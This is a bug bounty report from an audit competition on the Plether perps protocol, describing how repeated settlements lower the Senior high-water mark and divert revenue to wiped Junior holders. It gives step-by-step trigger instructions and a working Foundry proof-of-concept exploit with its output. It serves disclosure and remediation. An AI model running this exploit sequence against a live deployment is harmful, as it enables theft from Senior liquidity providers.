# \#99956 [SC-High] Each committed LP settlement re-applies an unbacked recapitalization residual to equity Senior already owns, overwriting the Senior high-water mark downward, so later trader-loss revenue that should restore Senior is paid to wiped Junior holders

**Submitted on Nov 15th 2026 at 21:51:51 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99956
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

### Brief/Intro

After an insolvency the owner follows the runbook: `CfdEngine.recapitalizePool`, then `clearDegradedMode`. The recap is queued whole in `pendingRecapitalizationAssets`. The first settlement applies only the part that fits into distributable equity and sets the Senior high-water mark (HWM) to the full recap target. The rest stays queued as a residual, even though the cash behind it has already been paid to the trader claimant.

Every later settlement that commits caps that residual by the **gross** distributable equity, not by the equity left after the tranches' existing principal. So the residual is settled again against the same equity Senior already holds. The plan books Senior's principal as a loss, both principals become zero, and the "fresh recap" branch re-seeds Senior with the same amount and **overwrites the HWM with the smaller residual**. The HWM drops (48,804 → 27,888 USDG in the PoC) while pool cash does not move by a single unit.

Any wiped Junior holder can force those settlements: a full-balance Junior redeem at zero NAV is refunded, and the refund counts as settlement progress. Once trading resumes, trader losses arrive as revenue. Revenue fills Senior only up to the eroded HWM, and the rest goes to Junior. In the PoC, **17,998 USDG goes to Junior while Senior sits at 27,482 USDG against a recovery target of 48,804 USDG**. This breaks the documented guarantee "Senior impairment must be restored before junior extracts surplus" (`SECURITY.md:394`).

### Plain Summary

- The pool has two kinds of LPs. **Senior** must be made whole first. **Junior** only gets surplus after Senior is back at its mark (the HWM).
- Traders win big, the pool goes insolvent, and the owner tops it up by 48,804 USDG. That top-up is written down as a "pending recap" note.
- Settlement #1: only 20,916 USDG of real cash is left, so Senior gets 20,916 and Senior's target mark becomes 48,804. That is correct. A 27,888 note stays behind, but the cash for it already went to the winning trader.
- Settlement #2: no money moves. The code sees the old 27,888 note, applies it again to the **same** 20,916 Senior already has, and in the process **rewrites Senior's target mark from 48,804 to 27,888**.
- Later, losing traders pay in revenue. Senior is only refilled up to the lowered mark, and **17,998 USDG goes to Junior** while Senior is still about 21,000 USDG short of its real target.

### Vulnerability Details

**1. The recap is queued whole.** `HousePool.sol:644-645`:
```solidity
if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
@>  _recordPendingClaimantInflow(kind, amount);
```

**2. Each reconcile caps the buckets by the gross distributable equity.** `HousePool.sol:1833`:
```solidity
@> return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
```
`capClaimantBuckets` (`HousePoolPendingPreviewLib.sol:72-82`) returns `min(bucket, distributable)`. The principal that Senior and Junior already hold is not taken out first. A residual that is at least as large as distributable is therefore fully "settleable" again on every reconcile.

**3. The plan subtracts the settleable bucket first, then books the tranches' existing principal as a loss.** `HousePoolReconcilePlanLib.sol:68-71` and `:102-104`:
```solidity
if (pendingBucketAssets > 0) {
@>  snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
...
if (plan.deltaAssets > 0) {
@>  plan.state.waterfall = HousePoolWaterfallAccountingLib.absorbLoss(plan.state.waterfall, plan.deltaAssets);
```
With `distributable == D`, Senior principal `== D` and a residual `>= D`, distributable after the bucket is 0. Senior's whole principal D is treated as a loss, so `seniorPrincipal = juniorPrincipal = 0`. The HWM is still intact at this point, as designed. The `absorbLoss` natspec says so explicitly (`HousePoolWaterfallAccountingLib.sol:162-163`): "The senior high-water mark is deliberately unchanged so future revenue continues to restore senior impairment."

**4. The "both principals zero" recap branch then overwrites the HWM.** `HousePoolPendingPreviewLib.sol:118-121`:
```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
@>  state.waterfall.seniorHighWaterMark =
@>      recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
```
The branch is meant for a fresh recap of an empty pool. Here it runs on phantom zeros created by step 3. Senior is re-seeded with the same D, so principal looks unchanged, but the existing, higher HWM is never compared. It is replaced by the residual target. The residual bucket also shrinks by D with no cash behind it. This repeats on every committed settlement until the residual is smaller than D.

**5. Anyone holding wiped Junior shares can make the settlement commit.** A Junior redeem head whose quote is zero is refunded and counted as progress (`HousePool.sol:960-986`, `phase.processedEpochs += 1`). A full-balance request skips the minimum redeem size (`TrancheVault.sol:1611-1618`, `shares < maxShares`). The attacker calls `requestRedeem(fullBalance)`, anyone calls `settleLpEpoch`, the attacker calls `claimRedeemRefund`, waits out the 1h cooldown, and repeats.

**6. Where the value goes.** `distributeRevenue` (`HousePoolWaterfallAccountingLib.sol:140-159`) restores Senior only up to `seniorHighWaterMark` and gives the remainder to Junior (`:158`). With the HWM lowered by step 4, revenue that should still be refilling Senior goes to Junior.

**Required state.** At the moment of the re-settlement there must be no unfunded matured Senior redeem head. A Senior backlog skips the Junior phase (`HousePool.sol:878-879`), and the settlement then reverts with no progress instead.


### Impact Details

PoC with release params (MM 0.1%, IM 0.2%, Senior cap 40M / 80%), pool of about 132k USDG (Senior 41,000, Junior 91,000):

| Step | Senior principal | Senior HWM | Junior principal | Residual recap | Pool cash |
|---|---|---|---|---|---|
| After recap, claim paid | 41,000.68 | 41,000.68 | 90,999.32 | 48,804.29 | 20,916.13 |
| Settlement #1 | 20,916.13 | **48,804.29** | 0 | 27,888.17 | 20,916.13 |
| Settlement #2 (no flows) | 20,916.13 | **27,888.17** | 0 | 6,972.04 | 20,916.13 |
| Settlement #3 (no flows) | 20,916.13 | 27,888.17 | 0 | 0 | 20,916.13 |
| After trader-loss revenue | 27,482.34 | 27,482.34 | **17,998.38** | 0 | 45,480.73 |

- **Senior recovery protection erased with no economic event: 20,916.13 USDG** (43% of the 48,804 USDG target the owner's recap set).
- **Revenue paid to Junior while Senior is below its recovery target: 17,998.38 USDG.** Senior ends at 27,482 USDG against a target of 48,804 USDG.
- **Attacker gain:** the trigger holder owns 1/3 of Junior supply. Shares that were worth 0 now redeem for about 6,000 USDG.
- The loss per committed settlement is `min(residual, distributable)`, so it scales linearly with pool size (Senior cap 40M USDG).
- Junior is permanently ahead of Senior from then on. Senior's real target cannot be restored by any later flow, because the HWM itself has been rewritten.

### Mitigation

1. In `applyClaimantRecapitalizationIntent` (`HousePoolPendingPreviewLib.sol:118-121`), never lower an existing HWM:
   `seniorHighWaterMark = max(seniorHighWaterMark, recapitalizationTargetAssets, remaining)`.
2. Settle claimant buckets only against **new** equity. In `_settleablePendingClaimantBuckets` (`HousePool.sol:1833`), cap by `distributable - (seniorPrincipal + juniorPrincipal + unassignedAssets)` (saturating), so existing principal never competes with the bucket for the same equity.
3. Once a partial recap has been applied and the claim it funded has been paid, drop the unbacked residual while keeping the recap target in the HWM.

Options 2 and 3 must still release a residual whose backing genuinely returns (claims going to zero without a payout), which is the upstream-tested behaviour.

### References

- `packages/perps/src/CfdEngine.sol:632` `recapitalizePool`, `:658` `clearDegradedMode`, `:559` `settleTraderClaim`
- `packages/perps/src/HousePool.sol:644-645`: recap queued whole as a pending bucket
- `packages/perps/src/HousePool.sol:1829-1834`: `_settleablePendingClaimantBuckets` caps by gross distributable
- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:72-82`: `capClaimantBuckets`
- `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:68-71`: bucket subtracted from distributable
- `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:102-104`: existing principal booked as a loss
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:162-163`: HWM must stay unchanged on loss (design intent)
- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:118-121`: both-zero branch overwrites the HWM
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:140-159`: revenue fills Senior up to the HWM, the remainder goes to Junior
- `packages/perps/src/HousePool.sol:960-986`: zero-NAV redeem head refunded and counted as progress
- `packages/perps/src/TrancheVault.sol:1611-1618`: full-balance redeem bypasses the minimum size
- `packages/perps/src/HousePool.sol:878-879`: Senior backlog skips the Junior phase
- `packages/perps/SECURITY.md:394`: HWM protection guarantee; `:1504-1510`: recovery runbook
- `packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol:177-220`: upstream residual test (backing returns)

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/poc/RecapResidualSeniorHwmErosion.t.sol` and run:

```
forge test --root packages/perps --match-path test/poc/RecapResidualSeniorHwmErosion.t.sol --gas-limit 100000000000 -vv
```

It uses the repo's `BasePerpTest` fixture (full stack: engine, HousePool, Senior/Junior TrancheVaults, router) and only real router, vault and pool flows. The only mock is Pyth, which is out of scope. The owner's actions are the documented recovery runbook. The attacker is an ordinary Junior holder.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice PoC. Real router flows on the repo fixture (BasePerpTest), release risk params.
///         After the documented recovery runbook (recapitalizePool + clearDegradedMode) a reconcile applies only part of the
///         recap (capped at distributable) and leaves a residual whose cash was already paid to the trader claimant.
///         Every later settlement that commits re-applies that unbacked residual against the SAME distributable equity:
///         HousePoolReconcilePlanLib books the Senior's existing principal as a loss, the residual re-seeds it through the
///         "both principals zero" branch (HousePoolPendingPreviewLib.sol:118-122) and the Senior HWM is reset to the
///         residual. Any wiped Junior holder can force those settlements with a zero-NAV full-balance redeem (refund counts
///         as progress). Later trader-loss revenue then flows to Junior while Senior is still below its recovery target.
///         Save as packages/perps/test/poc/RecapResidualSeniorHwmErosion.t.sol and run:
///         forge test --root packages/perps --match-path test/poc/RecapResidualSeniorHwmErosion.t.sol --gas-limit 100000000000 -vv
contract RecapResidualSeniorHwmErosionPoC is BasePerpTest {

    address internal constant A = address(0xA11CE); // LONG winner
    address internal constant B = address(0xB0B); // SHORT winner -> trader claim
    address internal constant X = address(0xC0C0); // trader whose loss becomes queued revenue
    address internal constant SLP = address(0x5E1); // senior LP (victim)
    address internal constant JATT = address(0x1A77); // junior LP (beneficiary / trigger)

    uint256 internal currentPrice;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // release params (MM 0.1%, IM 0.2%, FAD 3%, vpi 0.01, maxSkew 0.4)
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 60_000e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        _refresh(1e8);
        _fundTrader(A, 100_000e6);
        _fundTrader(B, 100_000e6);
        _fundTrader(X, 100_000e6);
        _fundJunior(JATT, 30_000e6);
        _fundSenior(SLP, 40_000e6);
        _refresh(1e8);
    }

    // ------------------------------------------------------------------ helpers (router-driven)

    function _live(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        if (previous >= vm.getBlockTimestamp()) previous = vm.getBlockTimestamp() - 1;
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refresh(
        uint256 price
    ) internal {
        _mockPythUpdateData(price);
        bytes[] memory d = _live(price);
        router.updateMarkPrice(d);
        currentPrice = price;
    }

    function _trade(
        address who,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        vm.prank(who);
        router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory data = _mockPythUpdateData(currentPrice);
        router.executeOrder(router.nextExecuteId(), data);
    }

    function _size(
        address a
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
    }

    function _settleEpoch() internal {
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        vm.roll(vm.getBlockNumber() + 1);
        // book is flat during the settlements below -> permissionless pool entry point
        pool.settleLpEpoch(0, 0);
    }

    function _log(
        string memory tag
    ) internal view {
        console2.log(tag);
        console2.log("  seniorPrincipal / seniorHWM / juniorPrincipal", pool.seniorPrincipal(), pool.seniorHighWaterMark(), pool.juniorPrincipal());
        console2.log("  pendingRecap / pendingRevenue / unassigned", pool.pendingRecapitalizationAssets(), pool.pendingTradingRevenueAssets(), pool.unassignedAssets());
        console2.log("  pool totalAssets / trader claims", pool.totalAssets(), engine.totalTraderClaimBalanceAssets());
    }

    // ------------------------------------------------------------------ PoC

    function _juniorRefundTrigger() internal {
        // JATT holds wiped junior shares; a junior redeem head priced at zero NAV is refunded, which counts as settlement
        // progress and lets the settlement (and its reconcile) commit.
        uint256 id = juniorVault.controllerRedeemHead(JATT);
        if (id != 0 && juniorVault.refundableRedeemRequest(id, JATT) > 0) {
            vm.prank(JATT);
            juniorVault.claimRedeemRefund(id, JATT, JATT);
            vm.warp(vm.getBlockTimestamp() + 1 hours + 1); // refunded shares restart the 1h cooldown
            vm.roll(vm.getBlockNumber() + 1);
        }
        uint256 m = juniorVault.maxRequestRedeem(JATT);
        vm.prank(JATT);
        juniorVault.requestRedeem(m, JATT, JATT); // full balance: zero-NAV request bypasses the minimum size
    }

    function test_PoC_RecapResidualErodesSeniorHwmAndRoutesRevenueToJunior() public {
        // 1. Hedged book (~0.9 x pool each side), 20% margin, opened in alternating chunks (skew cap 0.4).
        uint256 ta0 = pool.totalAssets();
        uint256 chunk = (ta0 * 1e12 * 90 / 100) / 3 / 1e20 * 1e20;
        for (uint256 k; k < 3; ++k) {
            _trade(A, CfdTypes.Side.LONG, chunk, chunk / 1e12 / 5, false);
            _trade(B, CfdTypes.Side.SHORT, chunk, chunk / 1e12 / 5, false);
        }
        uint256 seniorHwm0 = pool.seniorHighWaterMark();
        // 2. Price falls -> LONG closes in profit (paid). Price spikes -> SHORT profit exceeds pool cash -> trader claim.
        _refresh(0.6e8);
        _trade(A, CfdTypes.Side.LONG, _size(A), 0, true);
        _refresh(1.95e8);
        _trade(B, CfdTypes.Side.SHORT, _size(B), 0, true);
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        assertGt(claims, pool.totalAssets(), "claim exceeds pool cash");
        _log("after trader wins (claims > cash, degraded)");

        // 3. Owner runbook (SECURITY.md:1506-1510): recapitalize deficit + buffer, clear degraded. Claimant takes its cash.
        uint256 deficit = claims - pool.totalAssets();
        uint256 recap = deficit + deficit * 3 / 4;
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        engine.clearDegradedMode();
        vm.prank(B);
        engine.settleTraderClaim(B);
        _log("after recap + clearDegraded + claim paid");

        // 4. Settlement #1: junior/senior wiped by the loss, recap applied up to distributable equity, HWM = full recap.
        vm.warp(vm.getBlockTimestamp() + 2 hours); // LP deposit cooldown (1h) since setUp
        vm.roll(vm.getBlockNumber() + 1);
        // (No Senior exit is queued: an unfunded matured Senior head would block Junior progress -> the settlement reverts with no progress instead.)
        _juniorRefundTrigger();
        _settleEpoch();
        uint256 s1 = pool.seniorPrincipal();
        uint256 h1 = pool.seniorHighWaterMark();
        uint256 r1 = pool.pendingRecapitalizationAssets();
        uint256 ta1 = pool.totalAssets();
        _log("after settlement #1");
        assertEq(h1, recap, "senior recovery target = full recapitalization (upstream-tested intent)");
        assertGt(r1, 0, "residual recap whose backing was paid to the claimant");
        assertEq(pool.juniorPrincipal(), 0);

        // 5. Settlements #2 and #3 with NO economic event in between (no trades, no deposits, pool cash unchanged).
        //    The only actions are JATT's zero-value junior redeem requests that give the settlement progress.
        _juniorRefundTrigger();
        _settleEpoch();
        _log("after settlement #2 (no flows)");
        uint256 h2 = pool.seniorHighWaterMark();
        _juniorRefundTrigger();
        _settleEpoch();
        _log("after settlement #3 (no flows)");
        uint256 s3 = pool.seniorPrincipal();
        uint256 h3 = pool.seniorHighWaterMark();
        assertEq(pool.totalAssets(), ta1, "no cash moved between settlements");
        assertEq(s3, s1, "senior principal unchanged");
        console2.log("senior HWM: before wipe / after #1 / after #2 / after #3", seniorHwm0, h1);
        console2.log("                                           ", h2, h3);
        console2.log("senior HWM protection lost with no economic event", h1 - h3);

        // 6. Trading resumes; real trader losses arrive as revenue. Senior is still below its recovery target (h1),
        //    but the eroded HWM routes the excess to the wiped Junior holders.
        uint256 juniorBefore = pool.juniorPrincipal();
        for (uint256 i; i < 3; ++i) {
            uint256 depth = pool.totalAssets();
            uint256 xSize = (depth * 35 / 100) * 1e20 / currentPrice / 1e20 * 1e20;
            _trade(X, CfdTypes.Side.SHORT, xSize, depth * 32 / 100, false);
            uint256 pLow = currentPrice - (depth * 30 / 100) * 1e20 / xSize;
            _refresh(pLow);
            _trade(X, CfdTypes.Side.SHORT, _size(X), 0, true);
            _refresh(1.95e8);
            uint256 sh = seniorVault.maxRequestRedeem(SLP) / 200;
            vm.prank(SLP);
            seniorVault.requestRedeem(sh, SLP, SLP);
            _settleEpoch();
        }
        uint256 s4 = pool.seniorPrincipal();
        uint256 j4 = pool.juniorPrincipal();
        _log("after trader losses (revenue) + settlements");
        console2.log("junior principal gained while senior below its recap target", j4 - juniorBefore);
        console2.log("senior principal / recovery target it should still be filling", s4, h1);
        assertLt(s4, h1, "senior still below its recapitalization target");
        // BUG 1: the Senior recovery target set by the recap was lowered by settlements with no economic event.
        assertLt(h3, h1, "BUG: senior HWM lowered with no economic event");
        // BUG 2: revenue reached the wiped Junior tranche while Senior is still below its recovery target.
        assertGt(j4, juniorBefore, "BUG: revenue reached Junior while Senior is below its recovery target");
    }
}
```

## Result:

Actually run: `forge test --root packages/perps --match-path test/poc/RecapResidualSeniorHwmErosion.t.sol --gas-limit 100000000000 -vv`

```
Ran 1 test for test/poc/RecapResidualSeniorHwmErosion.t.sol:RecapResidualSeniorHwmErosionPoC
[PASS] test_PoC_RecapResidualErodesSeniorHwmAndRoutesRevenueToJunior() (gas: 28587303)
Logs:
  after trader wins (claims > cash, degraded)
    seniorPrincipal / seniorHWM / juniorPrincipal 41000684942 41000684942 90999315058
    pendingRecap / pendingRevenue / unassigned 0 0 0
    pool totalAssets / trader claims 84701049121 112589216192
  after recap + clearDegraded + claim paid
    seniorPrincipal / seniorHWM / juniorPrincipal 41000684942 41000684942 90999315058
    pendingRecap / pendingRevenue / unassigned 48804292374 0 0
    pool totalAssets / trader claims 20916125303 0
  after settlement #1
    seniorPrincipal / seniorHWM / juniorPrincipal 20916125303 48804292374 0
    pendingRecap / pendingRevenue / unassigned 27888167071 0 0
    pool totalAssets / trader claims 20916125303 0
  after settlement #2 (no flows)
    seniorPrincipal / seniorHWM / juniorPrincipal 20916125303 27888167071 0
    pendingRecap / pendingRevenue / unassigned 6972041768 0 0
    pool totalAssets / trader claims 20916125303 0
  after settlement #3 (no flows)
    seniorPrincipal / seniorHWM / juniorPrincipal 20916125303 27888167071 0
    pendingRecap / pendingRevenue / unassigned 0 0 0
    pool totalAssets / trader claims 20916125303 0
  senior HWM: before wipe / after #1 / after #2 / after #3 41000684942 48804292374
                                              27888167071 27888167071
  senior HWM protection lost with no economic event 20916125303
  after trader losses (revenue) + settlements
    seniorPrincipal / seniorHWM / juniorPrincipal 27482342862 27482342862 17998384050
    pendingRecap / pendingRevenue / unassigned 0 0 0
    pool totalAssets / trader claims 45480726912 0
  junior principal gained while senior below its recap target 17998384050
  senior principal / recovery target it should still be filling 27482342862 48804292374

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 54.28ms (43.55ms CPU time)
```

